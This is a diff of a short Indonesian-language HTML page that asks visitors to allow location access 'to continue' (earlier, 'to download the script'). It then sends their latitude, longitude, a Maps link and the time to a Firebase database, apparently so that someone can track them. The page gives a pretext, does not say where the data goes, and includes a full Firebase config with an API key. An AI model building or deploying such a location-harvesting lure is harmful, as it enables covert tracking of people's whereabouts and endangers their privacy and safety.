@@ -1,78 +1,54 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <meta charset="UTF-8">
   <title>Izinkan Lokasi</title>
-  <script src="https://www.gstatic.com/firebasejs/9.22.1/firebase-app-compat.js"></script>
-  <script src="https://www.gstatic.com/firebasejs/9.22.1/firebase-database-compat.js"></script>
-  <style>
-    body { font-family: sans-serif; padding: 20px; }
-    button { padding: 10px 20px; font-size: 16px; margin-top: 10px; }
-    #message { margin-top: 15px; font-size: 16px; }
-  </style>
+  <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
 </head>
 <body>
-
-  <h2>Izinkan Lokasi Anda</h2>
-  <p>Untuk melanjutkan, silakan izinkan akses lokasi agar dapat mengunduh script di bawah.</p>
-  <button id="allowBtn">Izinkan Lokasi</button>
-  <div id="message"></div>
+  <h2>Harap izinkan akses lokasi Anda untuk melanjutkan.</h2>
+  <button onclick="mintaLokasi()">Izinkan Lokasi</button>
 
   <script>
-    // Konfigurasi Firebase
+    // Firebase config
     const firebaseConfig = {
       apiKey: "AIzaSyBeh7zmo47_qvlo35vJjil7Fn31XipkIV0",
       authDomain: "momon-db593.firebaseapp.com",
       databaseURL: "https://momon-db593-default-rtdb.asia-southeast1.firebasedatabase.app",
       projectId: "momon-db593",
-      storageBucket: "momon-db593.firebasestorage.app",
+      storageBucket: "momon-db593.appspot.com",
       messagingSenderId: "512788788909",
       appId: "1:512788788909:web:920143794faa0aaf413824",
       measurementId: "G-PD0VHY7GRC"
     };
 
+    // Inisialisasi Firebase
     firebase.initializeApp(firebaseConfig);
-    const database = firebase.database();
 
-    const btn = document.getElementById("allowBtn");
-    const message = document.getElementById("message");
-
-    btn.addEventListener("click", () => {
-      message.innerText = "Meminta akses lokasi...";
-
-      if (!navigator.geolocation) {
-        message.innerText = "Browser tidak mendukung geolokasi.";
-        return;
-      }
-
-      navigator.geolocation.getCurrentPosition(
-        (position) => {
+    function mintaLokasi() {
+      if ("geolocation" in navigator) {
+        navigator.geolocation.getCurrentPosition((position) => {
           const lat = position.coords.latitude;
           const lon = position.coords.longitude;
           const mapsLink = `https://maps.google.com/?q=${lat},${lon}`;
+          const time = new Date().toISOString();
 
-          const data = {
+          // Kirim ke Firebase
+          firebase.database().ref("lokasi").push({
             latitude: lat,
             longitude: lon,
             mapsLink: mapsLink,
-            time: new Date().toISOString()
-          };
+            time: time
+          });
 
-          // Simpan ke realtime database
-          const newRef = database.ref("lokasi").push();
-          newRef.set(data)
-            .then(() => {
-              message.innerHTML = `Lokasi berhasil disimpan:<br><a href="${mapsLink}" target="_blank">${mapsLink}</a>`;
-            })
-            .catch((err) => {
-              message.innerText = "Gagal menyimpan ke database: " + err.message;
-            });
-        },
-        (error) => {
-          message.innerText = "Akses lokasi ditolak atau error.";
-        }
-      );
-    });
+          alert("Lokasi berhasil dikirim!");
+        }, (err) => {
+          alert("Gagal mengambil lokasi: " + err.message);
+        });
+      } else {
+        alert("Browser tidak mendukung geolocation.");
+      }
+    }
   </script>
 </body>
 </html>
